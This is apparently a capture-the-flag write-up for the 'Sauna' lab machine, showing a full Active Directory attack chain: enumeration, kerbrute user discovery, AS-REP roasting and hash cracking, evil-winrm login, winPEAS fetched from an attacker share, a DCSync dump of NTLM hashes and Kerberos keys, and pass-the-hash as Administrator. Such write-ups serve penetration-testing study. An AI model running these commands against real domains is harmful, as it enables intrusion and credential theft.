# Enumeration

## NMAP

```bash
nmap -p- --min-rate=1000 -sVC -v -oN nmap 10.10.10.175

Nmap scan report for SAUNA.EGOTISTICAL-BANK.LOCAL (10.10.10.175)
Host is up (0.060s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-25 20:30:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-25T20:31:47
|_  start_date: N/A
|_clock-skew: 6h36m19s

Read data files from: /usr/share/nmap

```

## SMB

### Checking for null sessions

```bash
nxc smb 10.10.10.175 -u '' -p '' 
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
```

```bash
sauna nxc smb 10.10.10.175 -u '' -p '' --shares 
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.10.10.175    445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

We dont have a null sessions but we doo get a domain name

### Adding domain name to /etc/hosts

```bash
nxc smb 10.10.10.175 -u '' -p '' --generate-hosts-file  /etc/hosts
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\:
```

Using this we can add the domain we got by nxc and then adding it to /etc/hosts.

We don’t have much on smb

## Web server

The web server has a static website having a liltile bit information about the company, we have a about us page where we do have some names of the employes

![image.png](attachment:38e066a0-32b8-4881-aa02-0d6acc0adade:image.png)

We can now make a list of the username and get it in username format using username anarchy

### Users list

```bash
cat usernames

Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

### Username anarchy to get name in username format

```bash
/opt/username-anarchy/username-anarchy -i usernames > bruteusers.txt 
```

## User Enumeration

```bash
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL  --dc 10.10.10.175  users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/27/25 - Ronnie Flathers @ropnop

2025/07/27 01:18:05 >  Using KDC(s):
2025/07/27 01:18:05 >   10.10.10.175:88

2025/07/27 01:18:05 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2025/07/27 01:18:06 >  Done! Tested 88 usernames (1 valid) in 0.553 seconds
```

Here we got a valid username fsmith.

# Exploitation

## Asreproasting

We can see that the user have kerberoas pre auth enabled or not and the try to grab the hash and carck it.

```bash
nxc ldap 10.10.10.175 -u fsmith -p '' --asreproast ASREProastables.txt 
LDAP        10.10.10.175    389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
LDAP        10.10.10.175    389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7bf8b1ae421f4aea9c0bb9414e3fb73e$53823f030867d534cb5cca129af03c25c749d271545ef4ebfcb620b39efe64a493cb9076e7b03b0adcc730302db028626d3cff1dfc899356314b0856f8e5a4cfafc5bea0d8d1b2e603bf266987dac2faa64f278e7f7687ea4b09c5c874a4b6c896772db3b6a5a6685ab25093de42095654f6b497338e1a497e3b368465fab4fa7a9400e7f7055ab22b97aa2939a69c73a62471b4ab8447e1114314d93e244d11bd7d4d1e6227c980f38480aaa8ee9c9d40bc537e85192f22783d466db3427897264a27086e42125186f063dc1be78f2a151e1dae42232631ce8f381387522fb115d841e7d3351dbc30c388229f1384fd66e4ac1fc914bd4b8c857601ca800324
```

Here we got our hash

### Cracking the hash

```bash
hashcat ASREProastables.txt /usr/share/wordlists/rockyou.txt --show 
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7bf8b1ae421f4aea9c0bb9414e3fb73e$53823f030867d534cb5cca129af03c25c749d271545ef4ebfcb620b39efe64a493cb9076e7b03b0adcc730302db028626d3cff1dfc899356314b0856f8e5a4cfafc5bea0d8d1b2e603bf266987dac2faa64f278e7f7687ea4b09c5c874a4b6c896772db3b6a5a6685ab25093de42095654f6b497338e1a497e3b368465fab4fa7a9400e7f7055ab22b97aa2939a69c73a62471b4ab8447e1114314d93e244d11bd7d4d1e6227c980f38480aaa8ee9c9d40bc537e85192f22783d466db3427897264a27086e42125186f063dc1be78f2a151e1dae42232631ce8f381387522fb115d841e7d3351dbc30c388229f1384fd66e4ac1fc914bd4b8c857601ca800324:Thestrokes23
```

## User Flag

Now we have creds of user fsmith we can try to login from winrm and grab out user flag

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23                           
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> tree /a /f
Folder PATH listing
Volume serial number is 489C-D8FC
C:.
+---Desktop
|       user.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos

```

## Bloodhound

After our user flag we can run sharphound and get our data into our machine and graph the users and privs.

<img width="1088" height="587" alt="image" src="https://github.com/user-attachments/assets/fac85960-15dc-4ede-849d-d4c1436b0849" />


After loading data into blooodhound and getting the principlas with cdsync rights we can see that a non deafult user svc-loanmgr also has dcsync rights over the domain.

## Running Winpeas

We can copy the winpeas throught various methods and run it.

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>copy //10.10.14.20/winPEASx64.exe
```

After running winpeas We can see that there is a autologon credentials of user svc-loagnmgr with the password.

<img width="830" height="296" alt="image" src="https://github.com/user-attachments/assets/9fcc013d-2769-4084-ba1b-61f4b9a1f81d" />


Now we got the creds of the svc-loanmgr we can perform our dcsync attack and get the hash of the administrator and log in using pth.

## Log in as administrator

### Performing DcSync as svc_loanmgr

```bash
impacket-secretsdump svc_loanmgr@10.10.10.175                                           
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:d1920a8a283a6b5e5f3a0b1195a4d3f2:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:c64236f43087169669d78f92025ca90766d8519d51ea310ae88f6d16e7acd2a2
SAUNA$:aes128-cts-hmac-sha1-96:7a2b55dd9b46775f4dd94c69a0c5cd24
SAUNA$:des-cbc-md5:cec4f168382a588f

```

Now we got the hash of administrator we can log in

```bash
vil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
```
